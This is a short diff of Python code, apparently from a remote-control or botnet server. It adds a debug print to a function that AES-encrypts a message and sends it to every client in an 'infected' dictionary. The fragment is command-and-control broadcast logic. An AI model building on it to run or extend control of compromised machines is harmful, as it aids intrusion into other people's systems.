@@ -225,6 +225,7 @@ def send_message(message, infected_dict):
         for name, socket_client in infected_dict.items():
             try:
                 final_mess = aes_encrypt(infected_dict[socket_client][2], final_mess)
+                print("mess encrypted")
                 socket_client.send(header + final_mess.encode("utf-8"))
             except Exception:
                 pass
